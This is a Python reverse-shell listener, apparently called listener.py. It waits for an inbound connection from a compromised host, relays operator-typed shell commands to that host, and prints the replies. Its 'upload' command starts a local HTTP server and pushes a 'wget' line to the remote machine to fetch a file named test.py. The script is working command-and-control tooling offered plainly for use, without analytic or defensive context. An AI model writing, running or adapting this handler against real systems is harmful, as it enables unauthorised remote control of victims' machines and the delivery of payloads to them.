#!/usr/bin/env python3
import socket
import random
import http.server
import socketserver
import threading
import sys

def simple_server(port):
    # print("serving at port", port)
    handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", port), handler)
    server_thread = threading.Thread(target=httpd.serve_forever,daemon= True)
    server_thread.start()
    return server_thread, httpd

def main():
    
    if len(sys.argv) != 2 or not sys.argv[1].isdigit(): 
        print ("usage python listener.py <Port>")
        return 1

    server = '0.0.0.0'
    #port = random.randint(10000, 50000)
    port = int(sys.argv[1])
    print ('inside main')
    print (sys.argv[1])

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:

        sock.bind((server, port))
        sock.listen()
        print('\n--------Listening on port----------', port)
        conn, addr = sock.accept()

        sock.settimeout(0.1)
        conn.settimeout(0.1)
   
        with conn:
            print ("Session Started")

            while True:
                # print("-$ "), end = "")
                conn.sendall("pwd\n".encode("utf-8"))
                data = conn.recv(16392)
                data_decoded = data.decode("utf-8")
                formated = str (data_decoded[0:-1])+ " $"
                #print(data_decoded )+"$",end = ""))
                print (formated, end= "") # end = "" we took this out because of error


                try:
                    command = input()+ "\n"
                    if command.startswith("upload"):
                        thread, server = simple_server(8080)
                        host_name = socket.gethostname()
                        host_ip = socket.gethostbyname(host_name)
                        print("IP :", host_ip)
                        url = 'wget %s:8080/test.py' % host_ip
                        conn.sendall((url + '\n').encode('utf-8'))
                        server.shutdown()
                        thread.join()
                        continue
                
                    else:
                        conn.sendall(command.encode("utf-8"))
                    try:
                        # print("-$ ", end="")
                        data = conn.recv(16392)
                        data_decoded = data.decode("utf-8")
                        print(data_decoded)
                        continue

                    except socket.timeout:
                        conn.sendall('pwd\n'.encode('utf-8'))
                        data = conn.recv(16392)
                        data_decoded = data.decode("utf-8")
                        print(data_decoded)
                        continue

                except KeyboardInterrupt:
                    print ("\n---------Goodbye-----------")
                    sock.close()

if __name__ == '__main__':

    try:
        main()
    except Exception as E : 
        print (E)
        sys.exit()
